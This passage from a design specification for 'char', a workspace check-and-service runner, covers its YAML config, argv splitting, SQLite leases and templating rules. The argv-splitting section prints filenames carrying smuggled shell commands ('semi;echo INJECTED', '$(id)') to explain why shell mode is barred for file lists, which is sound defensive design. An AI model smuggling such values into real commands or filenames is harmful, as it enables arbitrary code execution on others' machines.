- **`--artifacts`** — also removes declared `owns.files` (§6.1). Off by default because those
  cost disk but leak nothing machine-global, and removing them makes the next `init` pay a
  full reinstall. `char clean --artifacts --all` is the reclaim-disk answer; it is a no-op
  under `--orphaned`, where the files are already gone with the directory.

**`--all` skips any workspace holding a live lease, and reports what it skipped.** `--all` is
every workspace on this machine, so on the five-concurrent-agents premise this project is built
around, the unguarded version stops four live stacks and deletes their `node_modules` while
their agents are mid-run. §3.3 already warns that `--project` "will stop other worktrees'
services — which is exactly why it is not the default"; `--all` is strictly broader and had no
such guard. The check is one query against `leases`, and skipping is right rather than
refusing: reclaiming disk from the eleven idle workspaces is still the thing you asked for.
`--force` overrides, because "I know, stop them" is a real intent.

`--project` on `clean` **will** stop other worktrees' services — which is exactly why it is
not the default.

---

## 4. Configuration

### 4.1 `char.yml` — committed

**Defaults, because an unstated default is a per-implementer decision.** `version: 1` is
required — a config with no version is `bad_config`, since the whole point of the key is to
exist before it is needed. `cost:` defaults to **1**. `scope:` defaults to **file**.
`shell:` defaults to **false**. `check.timeout:` defaults to **900 seconds**, overridable
per check and machine-wide as `check_timeout` in `~/.char/config.toml` (§4.3.1) — a check with
no deadline is a hung merge gate, so the default is a real number rather than "none".
`ready.timeout:` defaults to 60 (§6.0).

**One `components:` mapping.** A component is a named thing that may have source to check
(`checks:`), a process to run (`run:`), or both. Do not split these into separate `units:`
and `services:` blocks — they are two *axes*, not two kinds of thing, and splitting them
makes the both-axes case (an API server) read as duplication.

```yaml
version: 1

components:

  # runs only — not your source
  postgres:
    run:
      driver: compose
      file: [docker-compose.yml]   # a list — repos often run base + override
      ports: { pg: 5432 }          # remapped into this workspace's block (§6.0)

  # BOTH axes
  api:
    root: services/api           # must stay inside the workspace root (§5)
    match: ["backend/**"]        # scoping by changed files
    setup: uv sync               # what `char init` runs
    run:
      driver: command
      cmd: manage.py runserver 0.0.0.0:${port.api}
      ports: { api: 8000 }
      ready: { http: "http://127.0.0.1:${port.api}/healthz" }
      needs: [postgres]
      env: { DJANGO_SETTINGS_MODULE: app.settings.dev }
      stop: ./scripts/graceful-stop.sh    # optional; default is killpg
    checks:
      lint:
        cmd: ruff check ${files}
        fix: ruff check --fix ${files}
        timeout: 120
      types: { cmd: mypy . }
      test:
        in: api                  # runs inside api's container (§4.1)
        cmd: pytest ${files}
        env: { DJANGO_SETTINGS_MODULE: app.settings.test }
        timeout: 600
        cost: 4                  # CPU slots, machine-wide (§4.3)
        needs: [postgres]

  # checks only — a library, never runs
  web:
    root: web
    match: ["web/**"]
    setup: pnpm install --frozen-lockfile
    owns:                        # component level — what setup: created (§6.1)
      files: [node_modules]      # removed only by `clean --artifacts`
    checks:
      lint:  { cmd: "pnpm eslint ${files}", fix: "pnpm eslint --fix ${files}" }
      types: { cmd: pnpm typecheck }
      test:  { cmd: pnpm vitest run, cost: 2 }
      e2e:
        cmd: pnpm e2e
        scope: component         # never file-scoped
        timeout: 900
        cost: 4
        exclusive: [browser]     # machine-wide mutex, never shared (§4.3)
        needs: []                # boots its own servers — see §4.4
```

#### Four things the above example uses and an earlier draft never defined

**`${port.NAME}` is a single workspace-global namespace**, not per-component. A component may
reference another's port — `multi-lang`'s Rust worker builds `CONTROL_URL` from the Elixir
service's `${port.http}` — which is the ordinary case whenever two services talk to each other.
The cost is that **two components may not declare the same port name**; `config verify` rejects
it, because `${port.http}` would otherwise be ambiguous with no diagnostic.

**`ports: { pg: 5432 }`** — the name maps to the port **the service itself listens on**.
char claims a host port from this workspace's block and maps it. `${port.pg}` always resolves
to the **host** port, because that is the one anything outside the container must connect to.
For `driver: command` there is no mapping layer: the claimed host port *is* the port, and the
command is expected to bind it.

**Port blocks are claimed, then verified bindable.** The database (§4.3) records only what
*char* has claimed — it knows nothing about an unrelated dev server already sitting on 5460.
So `init` attempts to bind each port in a candidate block before claiming it, and picks
another block if any is taken. Block size is configurable; its default is a convention, not
a measurement.

**`scope:`** takes `file` (the default) or `component`. `file` means the check receives
`${files}`; `component` means it always runs over the whole component, which is what
`web:e2e` needs — an end-to-end suite scoped to two changed files tests nothing. **A
`scope: component` check containing `${files}` is `bad_config`**, not a silent empty
expansion: the two say opposite things, and quietly honouring one of them is how you get a
suite that appears to run and covers nothing.

**Every check runs from the workspace root, and `${files}` paths are workspace-relative.**
One base for everything — cwd, `${files}`, and `match:` globs all agree. This was undefined in
an earlier draft, and it is the most-referenced undefined fact in the schema: two readings give
two configs that both validate and one of which never runs.

Workspace-relative because **the primary consumer is an agent reading output and editing
files.** `backend/app/views.py:12` is directly actionable; `app/views.py:12` has to be prefixed
first, and the agent has to know by how much. The cost — commands carrying `--dir`, `--filter`
or `-C` flags — is already being paid: every fixture writes them, because that is how these
tools are normally driven in a monorepo.

**`root:` is not a working directory.** It says where a component's source lives: it scopes
`match:` and resolves executables for `config verify`. §7 reserves it to point *outside* the
workspace for multi-repo, so overloading it with a second meaning would collide with that.

#### How a `cmd:` is executed, and `setup:` idempotence

**Every `cmd:`, `fix:`, `stop:` and `setup:` step is argv-split by default — no shell.** char
splits on whitespace respecting quotes, and substitutes `${files}` as **separate argv
elements**.

**The reason is a trust boundary, and an earlier draft of this paragraph had it backwards.**
`char.yml` is *fully trusted* — you cloned the repo and ran char against it, and `cmd: rm -rf /`
needs no metacharacter to be destructive. Argv-splitting buys nothing there. It matters for the
values that cross a boundary **into** a command:

| Value | Comes from | Trusted? |
|---|---|---|
| `cmd:` itself | the config author | yes — running char is the trust decision |
| **`${files}`** | **filenames on the branch being checked** | **no** |
| `${ref}` | the config, into a provider command | treated as untrusted (§4.7 rule 1) |

**`${files}` is the dangerous one, and it is measured, not theoretical.** A filename may contain
`;`, `$(…)` or a quote — POSIX permits it, git emits it raw under `-z`, and under a shell it
executes:

```
sub/semi;echo INJECTED.py   →  ;echo INJECTED   runs as a separate command
sub/dollar$(id).py          →  $(id)            runs, and its output is substituted
```

Anyone who can push a branch to a repo using char then has **arbitrary code execution on every
machine that runs `char check` on it** — the verb agents call most.

> **`shell: true` combined with `${files}` is rejected by the schema.** Not a warning, not a
> `config verify` check, not a runtime guard: unrepresentable. A warning is advice, and this is
> the difference between a config being wrong and a machine being owned.

**`${files}` must stand alone as a whole token.** `ruff check ${files}` is legal;
`ruff check --stdin-filename=${files}` is `bad_config`. The placeholder expands to *n*
arguments, and *n* arguments cannot be pasted inside one — a schema-checkable rule that
removes the only case where the expansion has no meaning.

**char reads the file list NUL-delimited and never splits it itself** — `git diff -z`, `git
ls-files -z`, `git status -z`. Newline is a legal character in a POSIX filename, so a
line-oriented read of git's output turns one file into two nonexistent ones. Because argv
carries the values with no re-parsing, a filename with a newline in it survives end to end.

Under a shell, `${files}` is also word-split, so a filename containing a space silently becomes
two arguments — the same substitution failing quietly even without malice.

**`shell: true` opts a single entry into shell interpretation**, where `|| true`, pipes,
redirection and inline assignments all work:

```yaml
setup:
  - bundle install
  - { cmd: "createdb app_${workspace.id} || true", shell: true }
  - bundle exec rails db:migrate
```

It is per-entry and visible in the diff, so a reviewer can see exactly where shell semantics
are live. **`shell: true` is never permitted on `secret_providers[].cmd`** (§4.7 rule 1 exists
to keep `${ref}` out of a shell), and never in an entry using `${files}` — the schema forbids
both combinations outright.

**`shell: true` is not a security boundary and must not be described as one.** It is an
ergonomic escape for `|| true` and pipes in a config you already trust.

**`char init` is idempotent with respect to char's own state**, and that is the whole claim: one
port block per workspace id, `.char/` recreated, one row in `char.db`. **Whether re-running a
`setup:` step is safe is a property of the repo's commands.** A step that errors when its
resource already exists is the repo's to make tolerant — `|| true` under `shell: true`, or a
tool's own idempotent flag. A step that *succeeds* and does the wrong thing twice, like a seed
that duplicates rows, is a property of that command that a human re-running it by hand hits
identically; char does not try to fix it, and an earlier draft's per-step `once:` marker was
removed for exactly that reason.

#### `needs:` on a check takes components *and* check ids

```yaml
core:
  checks:
    build: { cmd: "pnpm --filter @acme/core build", scope: component }
ui:
  checks:
    types:
      cmd: "pnpm --filter @acme/ui typecheck"
      needs: [core:build]          # a check id — must PASS before this starts
    test:
      cmd: "pnpm --filter @acme/ui vitest run ${files}"
      needs: [postgres]            # a component — the service must be running
```

**The two forms are told apart by the colon**, which is why check ids are derived as
`<component>:<check>` and why a component name may never contain one.

| `needs:` entry | Means | If unsatisfied |
|---|---|---|
| a **component** (`postgres`) | the service must be running | char starts it (phase 4) |
| a **check id** (`core:build`) | that check must have **passed** in this run | see below |

Four semantics, because leaving any of them to the implementer produces four different tools:

- **A named check is pulled into the run even if the selector did not select it.** `char check
  ui:types` runs `core:build` first. Selecting a check selects its prerequisites; anything else
  makes the selector silently produce a broken run.
- **If a prerequisite fails, its dependents do not run** and are reported `ABORTED` with a
  message naming the failed check. They are not `FAILED` — they were never attempted, and an
  agent must not go looking for their output.

  **A cascaded `ABORTED` never sets `error.class`.** Per-check status and the run's error
  class are separate channels (§3.1), and the run's class comes from *why the run ended*: a
  prerequisite that failed its own tests ends the run at `tool_failed`, exit 1. Letting the
  cascade set `aborted` would exit 5 — the retryable class — for a deterministic test failure,
  telling a merge gate to try again on a bug that will fail identically forever. `aborted` is
  reserved for the run being stopped from outside it: SIGINT, or the acquisition ceiling.
- **Cycles are a `bad_config`, caught statically by `config verify`.** They are unrepresentable
  at runtime, so they must be rejected before one.
- **Ordering does not imply exclusivity.** Two checks that both need `core:build` still run
  concurrently once it passes, subject to the cost budget.

> **This is ordering, and deliberately nothing more.** §7 rules out a build DAG with caching —
> content hashing, output tracking, cache restore, staleness — and that line does not move. char
> knows *"`ui:types` runs after `core:build` passes"*; it does not know what `core:build`
> produced, whether the output changed, or whether it could have been skipped. **The moment char
> asks whether a prerequisite's output is stale, it has become turbo, badly.**
>
> Honest risk, recorded because §8.1's `pnpm-monorepo` fixture exists to ask this exact
> question: ordering is the first step of the slope §7 names. It was added because inter-check
> ordering is real and common — `ui:types` genuinely cannot run before `core:build` — and
> because the scheduler already holds an ordering graph for `needs:` against components, so this
> is an edge in a graph that exists rather than a new subsystem. A repo that wants caching still
> delegates: `cmd: turbo run build --filter=@acme/core` gets turbo's graph inside char's
> scheduling.

**`checks:` take `env:`, with the same rules as `run:` and `commands:`.** Literals plus the
four substitutions, `${env.NAME}` reads permitted (§4.4), and the parent environment inherited
and layered underneath.

An earlier draft gave `env:` to `run:` and `commands:` and not to `checks:`, which reads as an
oversight rather than a decision — all three spawn a process, and no rationale anywhere defended
the exclusion. It bites nearly every real repo: `MIX_ENV=test`, `DJANGO_SETTINGS_MODULE`,
`RAILS_ENV=test`, `NODE_ENV=test`. The available workarounds all leak — prefixing `cmd` with an
assignment requires `cmd` to be shell-interpreted, which nothing states and §4.7 rule 1
deliberately avoids elsewhere; putting it in `run.env:` is the wrong scope and impossible for a
component with no `run:` at all, which `python-ml` has three of.

#### `in:` — running a check inside a container

```yaml
components:
  api:
    run: { driver: compose, file: [docker-compose.yml, docker-compose.dev.yml] }
    checks:
      test:
        in: api                    # the compose *service* named `api`
        cmd: pytest ${files}
```

char builds the `docker compose … exec -T` invocation itself, from **the file list and project
name it already owns**. Without this the only way to express it is to write the whole command by
hand — which duplicates `run.file:`, is easy to get subtly wrong (omit `-T` and it allocates a
TTY and hangs in CI), and, worst, hardcodes `char-${workspace.id}`. That is §6.0's *internal*
naming convention; every config depending on it would freeze a private implementation detail.

**`in:` names a compose service, not a component.** A component's compose files routinely
define several services — `api`, `worker`, `migrate` — and `docker compose exec` needs one of
them, so a component name would leave char guessing. The service must be defined by the
**enclosing** component's `run.file:` list, which `config verify` checks against the resolved
document (§6.0 step 1) — so a typo'd or deleted service is a `bad_config` in pass 1 rather
than an exec failure at runtime. That the example reads `in: api` under component `api` is the
common case, not the rule.

Two consequences: the enclosing component must be `driver: compose`, and `in:` **implies
`needs:`** on it — the container has to be running, which per phase 4 means char starts it.

**A check with `in:` may not be granted `secrets:`.** It is `bad_config`, because the only way
to hand a value to an exec'd process is `docker compose exec -e KEY=value`, which puts the
value **in argv** — readable by anyone who can run `ps` on the host, and recorded in the
daemon's exec inspect. That violates §1.8 outright. A container's environment is compose's
job: the service already has what it needs from the `environment:` the repo declared.

**char passes the same workspace-relative paths and sets the working directory to the mount
point.** It cannot verify that the repo's bind-mount matches — but a single stated convention is
exactly what lets a repo set its mount up correctly.

**`${files}` is the set of files changed against the merge-base with the default branch,
plus uncommitted working-tree changes.** And the case that matters:

> **If the set is empty, the check is skipped — it is never invoked with no arguments.**

**Skipped is `SKIPPED`, a terminal state that maps to exit 0 and does not make a run
`PARTIAL`.** It needs its own token: `PASS` would claim the tool ran and approved, and
`ABORTED` would claim something went wrong. Nothing went wrong — there was nothing to check.
`results[]` carries `{"status": "SKIPPED", "reason": "no matching files"}` so an agent that
expected a check to run can tell "no files matched" from "never selected".

This is not a nicety. `ruff check` with no paths checks the entire tree; a file-scoped check
that silently degrades into a full-tree run turns a three-second lint into a several-minute
one, and does it precisely when nothing needed checking.

Check ids are **derived** as `<component>:<check>` — `api:lint`, `web:e2e`. Never written by
hand, so they cannot drift, collide, or be typo'd.

**`:` is reserved.** Component and check names match `^[a-z0-9][a-z0-9_-]*$` and may never
contain a colon. That is what makes a derived id unambiguous, and it is now load-bearing in a
second place: `needs:` tells a component from a check id by the colon alone (below). Selectors that fall out for free:
`char check web:e2e`, `char check --component web`, `char check lint`.

`char up` starts every component with a `run:`. `char check` runs every component with
`checks:`.

### 4.2 `.char/` — gitignored, and deliberately holds nothing reclaimable

```
.char/
  logs/<component>.log            services — `up` is not a run, so it has no run-id
  run/<run-id>/
    state.json                    per-check status, verdict
    logs/<component>.<check>.log  checks
```

**Services log outside `run/`** because `char up` is not a run and has no run-id. An earlier
draft gave the only log path as `run/<run-id>/logs/`, which left `char status` reporting a
crashed service with nowhere to point.

**One rule decides what may live here: if losing it would leak a resource, it does not belong
in `.char/`.** A workspace directory is deleted by `rm -rf` or `git worktree remove`, neither
of which consults char — so anything recorded only here is gone precisely when it is most
needed. Run artifacts are safe because a run without its workspace is meaningless anyway.

An earlier draft put `owned.json` here — container ids, networks, **pids**. That was the
defect: delete the directory and the record of what to reclaim died with it, reproducing the
plan's own motivating bug. Containers and networks survived it only by accident, because they
carry a `char.workspace=<id>` label and are findable without any record at all. Pids are not.
Everything reclaimable now lives in §4.3.

`char clean` removes `.char/` entirely; `char init` recreates it. **`clean` releases
resources; it does not undo installation.** An earlier draft said it returns the workspace to
its "pre-init state", which overclaims — `node_modules` and a populated `.venv` survive, by
design, unless `--artifacts` is passed (§6.1). `char clean` is not `git clean -xfd` and should
not read as if it were. **Log growth is a separate
problem with a separate answer** — coupling retention to `clean` would mean either logs live
forever or you lose the evidence from a failed run the moment you release a port. At the start
of each run char reaps old run directories, keeping the most recent N and never touching one
whose run lease is live. N is configurable; its default is a convention, not a measurement.

### 4.3 `~/.char/char.db` — machine-global, SQLite

The only cross-workspace state, and the only thing that survives a workspace directory being
deleted.

```
workspaces   id, path, project, ports, claimed_at
owned        workspace, kind, ref, boot_id, started_at
                 kind = container | network | volume | image | pgid
leases       workspace, kind, key, heartbeat_mono, boot_id, pid, pid_started_at
                 kind = run-lock | cpu-slot | exclusive

PRAGMA user_version = 1        written at creation; see below
```

**`heartbeat_mono` is a monotonic reading, not a wall clock.** `ARCHITECTURE.md` §1.1 gives
`now` three jobs and one of them is heartbeat staleness — but a backwards NTP step, or a laptop
resuming after four hours, makes a live holder's heartbeat look arbitrarily cold on a wall
clock, and a stolen exclusive is exactly the outcome this section rejected a TTL to avoid:
*two workspaces hold one mutex with no error anywhere.* Staleness is measured on
`CLOCK_MONOTONIC`, which does not step; `claimed_at` stays wall clock because it is only ever
displayed. Monotonic readings are meaningless across a reboot, which is what `boot_id` is for.

**`boot_id` and `pid_started_at` are what make a pgid reclaimable.** Without them, every
`owned` pgid row survives a reboot as an unreclaimable "possible leak" that `status --all`
reports forever, because char cannot tell a recycled pid from its own. With them it can: a row
whose `boot_id` is not the current one is stale by definition, and a live pid whose start time
differs from the recorded one is a different process. That turns "report forever" into "reap
safely", and it is the same liveness cross-check that makes a lease's `pid` trustworthy.

**`PRAGMA user_version` is a presence sentinel, and it exists because the failure it catches is
silent.** Measured: delete `char.db` while a process holds it open under WAL and that process
keeps reading and writing a consistent world through the unlinked inode, while the next process
creates a fresh file at the same path and hands out a port block the first one already holds.
Neither errors. A zero-length `char.db` — an interrupted write, a synced-home conflict copy —
is worse still: it reports `no such table`, which is indistinguishable from a fresh install. So:
**a database with no `user_version` where rows were expected is `environment`, not a fresh
install**, and char says the state store is gone rather than quietly issuing a duplicate claim.
The bind probe does not save you here — a workspace that ran `init` then `down` holds its block
with nothing bound.

The `project` column is the whole implementation of `--project`: filter by it, then read the
`owned` rows. Claims are idempotent by workspace id.

#### Why SQLite rather than a JSON file

Because of **leases**, and leases exist because `char check` runs for a long time. A ten-minute
test suite is normal in a large repo, and during those ten minutes the run holds machine-wide
claims that renew a heartbeat every few seconds. Rewriting an entire JSON document under an
`O_EXCL` lockfile, five workspaces at a time, for the whole of a ten-minute run, is the wrong
shape for that write pattern — and it is exactly where [`PHASES.md`](PHASES.md) §11's registry-corruption risk lives.
SQLite is stdlib, one file, needs no daemon, and makes that risk largely disappear.

#### Connection setup is not optional

Three settings, every connection, no exceptions — see [`traps.md`](traps.md) for the
measurements behind each:

```rust
conn.pragma_update(None, "journal_mode", "WAL")?;   // property of the file, never a default
conn.pragma_update(None, "busy_timeout", 5000)?;    // driver defaults vary, some are 0
// and every transaction that may write:
let tx = conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
```

`TransactionBehavior::Immediate` is a typed argument rather than a connection-string flag,
which is one of the reasons the language decision landed where it did (§10.1) — the obvious
API is the correct one. A DEFERRED transaction that reads and then writes fails after **0 ms**
with `SQLITE_BUSY_SNAPSHOT`, which `busy_timeout` cannot rescue because the reader's snapshot
is already stale. That is the lease pattern exactly.

#### Leases: how long-running work holds machine-wide claims

```
acquire   insert a lease row
hold      renew the heartbeat from the shell's event loop

          INVARIANT: the shell's event loop never blocks. It selects over child
          output, timers and signals; it never waits on a child, never holds a
          SQLite transaction across a poll, and never calls a blocking read.
          Child waiting is a non-blocking reap. This is what makes "wedged but
          still heartbeating" unrepresentable rather than merely unlikely: a
          wedged loop is a loop that stopped selecting, and a loop that stopped
          selecting stopped renewing. Every blocking call added to that loop
          weakens the reclaim guarantee, so it is a review rule, not a style
          preference.
release   delete the row on exit
reclaim   a lease whose heartbeat has gone cold is dead — take it
```

**Renewal happens in the shell loop that steps the reducer — not a background timer.** That
single placement decision is what makes a hard TTL unnecessary. A background timer keeps
ticking while the scheduler is wedged, so the lease looks healthy forever and you need an
expiry to catch it; a loop-driven heartbeat simply stops, and the existing cold-heartbeat path
handles it.

The loop already exists: §1.2 of `ARCHITECTURE.md` has the shell sleeping until the next
deadline computed from state, so it wakes on a schedule regardless of how long any child runs.
A thirty-minute check does not stall it.

**There is deliberately no TTL.** An earlier draft added one for "wedged but still
heartbeating", and no value can work: the fixtures contain a 1800-second check and a
900-second `e2e` holding `exclusive: [browser]`, so a TTL long enough not to fire on a healthy
job is useless as wedge detection — and when it fires wrongly on an exclusive, **two
workspaces hold one mutex with no error anywhere.** That is worse than the visible hang it
replaces, and it repeats the mistake §2.3.1 avoids for orphaned pgids: acting on state char
cannot prove is stale.

A wedged holder therefore blocks until killed, and `char status --all` names it and how long it
has held. **Residual gap, stated rather than papered over:** a loop that keeps turning while
achieving nothing is a char bug, not a wedge, and no lease mechanism catches it.

**The run lease covers `init`, `up`, `down`, `clean` and `check` — every mutating verb, not
just `check`.** One per workspace, taken for the duration. Two agents in the same worktree is
the ordinary case this project assumes, and without it their `init` runs interleave setup steps
against the same tree, or one's `clean` tears down what the other's `up` is mid-way through
starting. `status` takes nothing: it reads.

**A verb that cannot take the run lease fails fast rather than queueing** (§3.2.1), naming the
holder — because unlike a cpu-slot, waiting on it means waiting for an entire other run, and
the caller almost always wants to know rather than to wait. `check --wait` is the opt-in.

This is the pattern §4.2 previously used for the run lock — pid plus heartbeat — moved
machine-global so it outlives the directory. Crash recovery falls out of it: a runner that
dies stops renewing, and the next claimant reclaims. So does the deleted-mid-run case: the
lease is in `~/.char/`, still visible and still reclaimable.

#### Contention: what blocks, what fails fast, and why they differ

| Lease | The question it answers | Behaviour |
|---|---|---|
| **run lease** | "is another run already going in *my* workspace?" | **Fail fast** (§3.2.1) — you probably did not mean to start a second one |
| **cpu-slot** | "is the machine busy?" | **Block.** A budget that errors instead of queueing is not a budget |
| **exclusive** | "is another workspace using the browser?" | **Block** — and this is where the wait can be long |

An earlier draft applied §3.2.1's fail-fast rule to the run lease and left the resources it
was reasoned *about* unaddressed, which reintroduced the silent wait across workspaces. The
defect was never blocking; it was blocking **invisibly and without a ceiling**.

So a waiting check is **visible in the payload**, naming what it waits on and who holds it:

```json
{ "id": "web:e2e", "status": "WAITING",
  "waiting_on": { "exclusive": "browser", "held_by": "7c21ab90", "since_ms": 44000 } }
```

**The ceiling is 15 minutes of cumulative waiting per check, and it is configurable** —
`acquire_timeout` in `~/.char/config.toml` (§4.3.1), machine-global like everything else about
resource budget. It counts time spent waiting to acquire, not time spent running; a check that
waits 14 minutes and then runs for an hour is not affected. It exists so that an abandoned
lease whose holder died between heartbeat and reap cannot hang a merge gate indefinitely, and
15 minutes is chosen to be longer than any legitimate exclusive hold in the fixture set
(`web:e2e`, the longest, is ~6 minutes) and short enough that a human notices.

After it expires the check fails with a **retryable** class:

```
status: FAILED   error.class: aborted   "browser held by 7c21ab90 for 15m"
```

That is the shape SQLite itself uses, measured in [`traps.md`](traps.md): a contending writer
waits the full `busy_timeout` and then fails with `SQLITE_BUSY` (5), which is retryable —
distinct from `BUSY_SNAPSHOT` (517), which arrives in microseconds and is not.

**Four more extended codes arrive through the identical error type and mean something else
entirely.** `SQLITE_FULL` (13), `SQLITE_CANTOPEN` (14) and `SQLITE_CORRUPT` (11) are all class
`environment` — the machine is broken, not the config and not the tool. Branch on the extended
code, never the message, and never let one of these fall into the retry path that 5 belongs to:
retrying a claim against a full disk is an infinite loop.

**Under a full disk the system looks healthy from the lease's point of view**, which is why
this needs saying. Measured: a claim fails with `SQLITE_FULL` while a *smaller* subsequent
write still succeeds — so heartbeats keep renewing, nothing looks stale, nothing gets reclaimed,
and every new claim fails. Report `environment` on the first `SQLITE_FULL` rather than treating
it as contention.

**Corruption is not detected where you would expect it.** Measured: `BEGIN IMMEDIATE` succeeds
on a corrupt file and `SQLITE_CORRUPT` surfaces only when the damaged page is touched — so a
lease acquire can get part-way in. Treat it as `environment` wherever it appears rather than
assuming a clean transaction boundary.

#### Deadlock is prevented by construction, not detected

Once exclusives are machine-wide, a cycle spans **processes**: workspace A holds `browser` and
wants `gpu` while B holds `gpu` and wants `browser`. Neither ever releases, because release
happens when work *finishes* and neither can *start*.

**The reducer cannot catch this.** `step(state, event)` models one run; run A's state machine
has no idea run B exists, so no unit test can construct the cycle. §1.2's argument was that
making the scheduler a reducer puts deadlocks within reach of a unit test — this particular
deadlock crawled out of that reach when the resources went machine-wide.

> **Rule: acquire `exclusive:` first, in sorted name order, then `cost:` slots — and never
> hold a slot while waiting on an exclusive.**

**Both halves matter, and an earlier draft only had the first.** Sorting orders exclusives
against each other, but `cost:` slots are *also* machine-wide leases and were outside that
order — so A could hold eight slots and wait on `browser` while B held `browser` and waited on
slots. A cycle across two lease *classes*, untouched by sorting them within one. The proof
below holds only inside a totally-ordered class, and it was asserted across all of them.

Acquiring exclusives first closes it: a run waiting on an exclusive holds **nothing** a
slot-waiter needs. Release in reverse.

That makes a cycle impossible rather than unlikely, **for every possible interleaving**. If a
worker waits for X, everything it holds is below X — it acquires upward and has not reached X.
Follow a supposed cycle and the awaited resource strictly increases at each step, so returning
to the start would require X > X. No step in that argument mentions speed, arrival order or
scheduling, which is why it is preferred over detection: timing cannot defeat it.

**Verified by a cross-process integration test**: two real processes declaring the same two
exclusives in opposite order must both complete. Without the sorting they hang — which is the
point of testing it, since the rule is easy to write down and easy to forget.

**What ordering deliberately does not fix**, and what does:

| Failure | Handled by |
|---|---|
| Two workers stuck on each other forever | sorted acquisition — no recovery exists, so it must be impossible |
| B waits fifteen minutes for A's slow suite | not a failure; `WAITING` plus `waiting_on.held_by` makes it visible and attributable rather than silent |
| A crashes holding `browser` | heartbeat expiry |
| A is wedged but its heartbeat still ticks | **cannot happen, given the invariant below** |

**`cost:` and `exclusive:` are machine-wide, not per-run.** Ports were already claimed
machine-globally; CPU slots and named exclusives were not, which meant five concurrent
workspaces each granted themselves the full CPU budget and each granted themselves the same
browser or GPU. With ten-minute runs that is sustained 5× oversubscription rather than a brief
overlap, on exactly the "five agents on one machine" case §2.1 calls the one that matters.

#### Why not a daemon

A daemon would buy one thing this does not: **prompt** reaping, seconds after a directory
vanishes rather than at the next `char init`. Everything else it offers, a lease already
provides — and it does so without a background process to install, upgrade, crash-recover, or
answer "is it running?" for, and without a `curl | sh` bootstrap that has to install a
service.

The reason char does not need one is that **the work process is already long-lived.** A
detached `char check` exists for exactly as long as its run, so it can hold and renew its own
leases. There is no state that outlives all char processes and therefore nothing for a
resident daemon to hold. (Contrast a tool whose pipeline outlives every command that touches
it — that shape genuinely needs a daemon. char's does not.)

### 4.3.1 `~/.char/config.toml` — machine capacity, never committed

```toml
cpu_slots       = 6      # default: max(1, num_cpus - 2)
port_block_size = 10
run_retention   = 10     # runs kept; see the 10 MB per-check log cap (§3.1)
check_timeout   = 900    # per-check default, overridable per check (§4.1)
acquire_timeout = 900    # cumulative wait for leases before FAILED/aborted (§4.3)
docker_timeout  = 30     # char's own deadline on every docker call (§6)
```

**`char.yml` declares how expensive a check is; this file declares how much the machine has.**
They cannot be the same file: `char.yml` is committed, and a repo cannot know your core count.
Three settings were previously described as "configurable" with no key and no home — this is
the home.

**`cpu_slots` defaults to `num_cpus - 2`, not `num_cpus`.** A budget that permits full
saturation makes the machine feel dead even while the work is correctly bounded, because the
editor, the agent processes and char itself all need something. Two agents running `char check`
concurrently then contend for **one** pool rather than each assuming a whole machine — which is
the machine-wide lease (§4.3) doing its job, and is impossible until this number exists.

`char check --jobs N` overrides it for a single run.

### 4.4 Templating: four substitutions plus two scoped placeholders, hard cap

**Everywhere:** `${port.NAME}`, `${files}`, `${component.root}`, `${workspace.id}`.

**Two scoped placeholders, each legal in exactly one place and nowhere else:**

| Placeholder | Legal only in | Unset / unmatched |
|---|---|---|
| `${env.NAME}` | `env:` blocks | `bad_config`, naming the variable |
| `${ref}` | `secret_providers[].cmd` (§4.7) | schema error — a provider `cmd` without it can never resolve anything |

**The cap says what char *substitutes*, not what may appear.** Under `shell: true`,
`${HOME}` is ordinary shell syntax and char passes it through **untouched** — banning it would
mean char policing a language it explicitly declined to parse. Under argv-split, which is the
default, an unrecognised `${…}` is `bad_config`: nothing would ever expand it, so it can only
be a typo or a placeholder someone expected char to know. One rule, two behaviours, and the
behaviour follows from whether anything downstream can interpret it:

| | `${port.api}` | `${HOME}` |
|---|---|---|
| argv-split (default) | char substitutes | **`bad_config`** — nothing expands it |
| `shell: true` | char substitutes | passed through; the shell expands it |

`${ref}` is listed here because an earlier draft introduced it in §4.7 without adding it to
the cap this section spends forty lines defending. It is a provider-template placeholder, not
a general substitution: it is substituted with the part of a secret reference following the
scheme, and it means nothing anywhere else.

**No conditionals, no loops, no expression language.** `${env.NAME ?? "default"}` is
rejected by the schema, not merely undocumented.

The reason is not parser cost — it is that requests arrive one at a time, each individually
reasonable, with no natural stopping point: `${port.api}` → `${env.CI ?? 0}` → `{{#if}}` →
`{{#each}}` → a language with no debugger, no types, and no stack traces, whose bugs are
yours to diagnose from a YAML file at the exact moment an agent is blocked.

**Why the line sits here rather than at three.** `${workspace.id}` was never really outside
the cap — §6.1's `owns:` example already used it, so the plan contradicted itself. And a
*bare* `${env.NAME}` is structurally a lookup from a namespace, exactly like `${port.api}`:
there is no operator and nothing to evaluate. The slope in the paragraph above does not begin
at the read — it begins at `??`, because the moment the read exists someone asks "what if it
is unset," and that question has precisely two answers: a default operator, or a loud error.

**So the error is the stopping point, and it has to stay one.** Unset is `bad_config`, exit
3, naming the variable. That is what makes this a resting place rather than a first step.

**One cost, accepted knowingly.** `${env.NAME}` makes `char.yml` environment-dependent —
`config verify` can check that the reference is syntactically valid, but it cannot know
whether the variable will exist on another machine, so a config can verify locally and fail
in CI. Every other part of this file means the same thing everywhere. That is the price of
the read, and it is why the read is confined to `env:` blocks.

**Do not reach for `${env.NAME}` for secrets.** It requires the value to be in the ambient
environment already, which in practice means a `.env` file or a shell `export` — a file or a
history an agent can read. That moves the leak earlier rather than removing it. Secrets have
their own mechanism (§4.7).

**Escape hatch for repos that genuinely need more:** write a generator script that *emits*
`char.yml`, committed and diffable. This is deliberately the same pattern as cdktf → Terraform
JSON.

> **char does not verify that a generated file is in sync, and has no `generated_by:` key.** An
> earlier draft added one, with `config verify --check` re-running the generator and comparing
> byte for byte. Three problems: it made `verify` execute an arbitrary repo command **in order to
> read the config**, which is the exact property §4.4 uses to reject Starlark; byte comparison fails on a formatter bump or
> a generated timestamp while the config is perfectly correct; and `--check` had no coherent
> meaning, since `verify` never modifies anything. A repo that generates its config keeps it in
> sync the way it keeps any generated file in sync — in its own CI. This is deliberately the same pattern as cdktf → Terraform JSON.

> **Considered and rejected: a Tiltfile-style Starlark config.** It is the strongest
> objection to the above — jumping straight to a real evaluator means you never *invent*
> conditionals, you inherit them, so there is no slope to slip down. It loses on one
> specific ground, and it is the ground this project stands on: the primary author and
> reader of this file is an agent. YAML can be schema-constrained on write and parsed on
> read; Starlark must be *executed* to know what it means.
>
> **The distinction, since verify's pass 2 does run repo code (§5):** pass 2 runs the commands
> the config *declares*, which is precisely what `char check` does — running them is the point,
